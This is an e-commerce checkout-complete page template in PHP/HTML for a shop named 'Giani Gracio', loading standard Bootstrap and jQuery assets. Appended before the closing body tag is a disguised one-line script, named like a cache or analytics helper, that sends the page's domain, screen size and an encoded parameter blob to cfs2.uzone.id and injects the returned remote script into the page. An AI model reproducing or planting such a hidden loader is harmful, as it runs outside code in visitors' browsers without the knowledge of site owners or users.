
<!doctype html>
<html lang="en">
<head>

	<meta charset="utf-8">
	<!--[if IE]>
		<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
	<![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="">
	<meta name="author" content="">
	
	<title>Giani Gracio | Online Shop</title>
	
	<!-- Bootstrap Core CSS -->
	<link href="<?=base_url()?>assets/css/bootstrap.min.css" rel="stylesheet">
	
	<!-- Google Web Fonts -->
	<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed:400,700italic,700,400italic,300italic,300" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Abel" rel="stylesheet" type="text/css">
	
	<!-- CSS Files -->
    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/stylecss.css" rel="stylesheet">
	<link href="<?=base_url()?>assets/css/responsive.css" rel="stylesheet">
	
	<!--[if lt IE 9]>
		<script src="js/ie8-responsive-file-warning.js"></script>
	<![endif]-->
	
	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
	
	<!-- Fav and touch icons -->
	<link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/fav-144.png">
	<link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/fav-114.png">
	<link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/fav-72.png">
	<link rel="apple-touch-icon-precomposed" href="images/fav-57.png">
	<link rel="shortcut icon" href="<?=base_url()?>assets/img/favicon.png">
	
</head>
<body>

<?php $this->load->view('topheader')?>
<?php
$this->load->model('modeldb');
$data['kategori'] = $this->modeldb->allcategories(); 
$this->load->view('navbar2', $data);
?>
<div class="main-container container">
	<!-- Breadcrumb Starts -->
		<ol class="breadcrumb">
			<li><a href="<?=base_url()?>">Home</a></li>
			<li class="active">Check Out Complete</li>
		</ol>
	<!-- Breadcrumb Ends -->
	<!-- Main Heading Starts -->
		<h2 class="main-heading text-center">
			Thank You For Your Order!
		</h2>
		<p class="text-center">Please Check Your Order History</p>
		<!--<div class="row">
			<div class="col-sm-6 text-center">
				<div class="panel panel-smart">
					<div class="panel-body">
						
					</div>
				</div>
			</div>
		</div>-->
</div>
<?php
$data['kontak'] = $this->modeldb->setting(); 
$this->load->view('footer2', $data);
?>
<!-- JavaScript Files -->
<script src="<?=base_url()?>assets/js/jquery-1.11.1.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery-migrate-1.2.1.min.js"></script>	
<script src="<?=base_url()?>assets/js/bootstrap.min.js"></script>
<script src="<?=base_url()?>assets/js/bootstrap-hover-dropdown.min.js"></script>
<script src="<?=base_url()?>assets/js/jquery.magnific-popup.min.js"></script>
<script src="<?=base_url()?>assets/js/custom2.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582H6x5iDAuv2BVACIgr3hsRyvCuufJ0UY0Ry6vOpcfdILgkQH18InGx%2fUcog9Na%2bzvt62XBF0GiTs5cT%2fRnc9yyHNdD3hM7EN1WldthAneOKxH3QabFiBzHqYufa2ileo%2fYGKYMRH4JPlPpPVBpwgIi49o1saFojuiHlvG768iKZxqxOZb76iXcU2FCAJseC1PmhchNfOojdWjoxPe9XFe3ruVa4INas%2bPSak6XVGXxss1%2bs4xvaDy%2bhd%2bfDmAS7TFbNKGr6qk3GI89mhV3s8oMYktPJ2IN6EQxWNonS3SrxH8YbkETOE6bBV6UGdWrRJDSPy6CGIItTIgqA%2bpPPZPXkD5MiL9SsWVi6il8ZVvDOkRK%2b0hiuW%2bGC8D04XiK6dLSacRuprQlQX6jkTuFbEJfB%2fYUpDdQymClFL%2f3NA%2fcbxzwohmluX665NWk8yf6gEPjvKics98gg5TD%2bAgWpbFUysDkQFCgTdJri%2fpza3H3U19tJJ6UUgp6W9j40nnzJwTkgkxqqn9jYkCSDCsgEo0GvYk3L6yhsTfqnCUw5qA2%2bY7jQzhzzZ%2bhuYrAxZncZg5g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>